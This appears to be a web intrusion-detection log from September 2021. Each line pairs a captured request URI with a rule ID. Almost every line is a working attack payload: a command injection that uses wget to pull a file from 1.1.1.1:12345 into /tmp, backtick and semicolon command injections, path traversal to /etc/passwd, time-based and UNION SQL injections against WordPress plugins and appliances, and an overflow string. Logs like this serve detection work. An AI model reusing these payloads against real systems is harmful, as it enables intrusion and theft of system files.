2021-09-04T11:19	/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)	s2b-1330-5
2021-09-04T11:19	/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1	s2b-1113-5
2021-09-04T11:19	/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile	s2b-1113-5
2021-09-04T11:19	/ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%3B+cat%20/etc/passwd	s2b-1147-7
2021-09-04T11:19	/cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=`(echo;id;uname -a)>&2`	s2b-1333-6
2021-09-04T11:19	/cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=%60(echo;id;uname%20-a)%3E%262%60	s2b-1331-5
2021-09-04T11:19	/gadgets/definitions/uptime.CapacityWhatifGadget/getxenmetrics.php?query_type=xenserverMem&time_frame=1&element=1 AND (SELECT * FROM (SELECT(SLEEP(5)))tayk)	script-HTTP::URI_SQLI
2021-09-04T11:19	/gadgets/definitions/uptime.CapacityWhatifGadget/getxenmetrics.php?query_type=xenserverMem&time_frame=1&element=1 AND (SELECT * FROM (SELECT(SLEEP(5)))tayk)	script-HTTP::URI_SQLI
2021-09-04T11:19	/protocol.csp?fname=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&opt=userlock&username=guest&function=get	s2b-2064-2
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=SpiderCalendar& search_events_by_title=&page_number=1&serch_or_not=&nonce_sp_cal=1e91ab0f6b&_wp_http_referer=/wordpress/wp-admin/admin.php?page=SpiderCalendar&id_for_playlist=&asc_or_desc=1&order_by=id,(select*from(select(sleep(2)))a)	s2b-1301-11
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=SpiderCalendar&search_events_by_title=&page_number=1&serch_or_not=&nonce_sp_cal=1e91ab0f6b&_wp_http_referer=/wordpress/wp-admin/admin.php?page=SpiderCalendar&id_for_playlist=&asc_or_desc=1&order_by=id,(select*from(select(sleep(30)))a)	s2b-1301-11
2021-09-04T11:19	/esbus/servlet/GetSQLData?SCHEMA=ESBUS_INTERNAL&TABLE=SCHEDULEDTASKS UNION ALL SELECT 1 and 1=1&FIELD=LASTRUN&NOHEADER=1&SELECT=CLASS=com.esbus.appliance.SOD_PolicyCheck_SystemRun_TimerTask&OUT=XML	script-HTTP::URI_SQLI
2021-09-04T11:19	/esbus/servlet/GetSQLData?SCHEMA=ESBUS_INTERNAL&TABLE=SCHEDULEDTASKS UNION ALL SELECT 1 and 1=1&FIELD=LASTRUN&NOHEADER=1&SELECT=CLASS=com.esbus.appliance.SOD_PolicyCheck_SystemRun_TimerTask&OUT=XML	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1=1	s2b-1301-11
2021-09-04T11:19	/actionphp/download.File.php?&file=../../../../../../etc/passwd	s2b-1113-5
2021-09-04T11:19	/fiyo/apps/app_article/controller/editor.php?id=" and sleep(10)&art_title=123	script-HTTP::URI_SQLI
